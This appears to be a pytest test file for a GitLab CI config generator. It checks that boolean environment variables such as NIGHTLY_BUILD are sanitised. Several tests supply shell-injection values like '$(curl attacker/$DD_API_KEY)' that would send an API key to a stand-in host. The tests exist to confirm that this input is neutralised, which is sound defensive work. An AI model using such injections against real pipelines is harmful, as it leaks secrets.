"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import io
import pathlib
import subprocess
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return None

        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
    info = gen_gitlab_config_mod.SuiteVenvInfo(
        environment_hashes=("hash-with-path", "hash-without-path"),
        python_versions={"3.12"},
        environments=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
        ddtest_metadata={
            "hash-with-path": ("first.txt", "tests/internal", "pytest tests/internal", ""),
            "hash-without-path": ("second.txt", "", "pytest tests/internal", ""),
        },
    )

    with pytest.raises(ValueError, match="hash-without-path"):
        gen_gitlab_config_mod._ddtest_module().validate_ddtest_venv_test_locations(
            "internal",
            info.environments,
            {environment_hash: metadata[1] for environment_hash, metadata in info.ddtest_metadata.items()},
        )


def test_ddtest_uv_jobs_preserve_the_suite_command(gen_gitlab_config_mod):
    output = io.StringIO()
    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
    metadata = {
        "uv123": (
            ".riot/requirements/uv123.txt",
            "tests/tracer/**/test*.py",
            "pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/",
            "PYTHONOPTIMIZE=1",
        )
    }

    ddtest_jobs.emit_ddtest_jobs(
        output,
        suite="tracer",
        stage="core",
        clean_name="tracer",
        config={"env": {}},
        environments=[("uv123", "3.12")],
        k=1,
        metadata=metadata,
        wait_lockfile=".riot/requirements/wait.txt",
    )

    content = output.getvalue()
    assert "extends: .ddtest_plan_uv" in content
    assert "extends: .ddtest_run_uv" in content
    assert "DDTEST_UV_COMMAND_uv123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
    assert "DDTEST_UV_ENV_uv123: PYTHONOPTIMIZE=1" in content


def test_ddtest_uv_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_mod):
    payload = gen_gitlab_config_mod._shell_environment(
        {
            "DDTEST_PYTEST_ADDOPTS": "-vv --ignore-glob='*civisibility*'",
            "DDTEST_SUITE_PATH": "tests/integration",
        }
    )
    result = subprocess.run(
        [
            "bash",
            "-c",
            'env_var=DDTEST_ENV; eval "export ${!env_var}"; printf "%s" "$DDTEST_PYTEST_ADDOPTS"',
        ],
        check=True,
        capture_output=True,
        env={"DDTEST_ENV": payload},
        text=True,
    )

    assert result.stdout == "-vv --ignore-glob='*civisibility*'"
    assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_migrated_jobs_use_uv_environments(gen_gitlab_config_mod):
    environment_hashes = ("first", "second", "third")
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="tracer",
            stage="core",
            suite="tracer",
            parallelism=2,
            python_versions={"3.10", "3.11"},
            environment_hashes=environment_hashes,
        )
    )

    assert "  extends: .test_base" in config
    assert "    TEST_SUITE: tracer" in config
    configured_hashes = {
        environment_hash
        for line in config.splitlines()
        if line.strip().startswith("TEST_ENVIRONMENTS_")
        for environment_hash in line.rsplit('"', 2)[1].split()
    }
    assert configured_hashes == set(environment_hashes)


def test_migrated_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value=".riot/requirements/wait.txt"):
        config = str(
            gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="contrib::requests", snapshot=True)
        )
    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()

    assert extends == ".test_base_snapshot"
    assert f"{extends}:" in test_templates
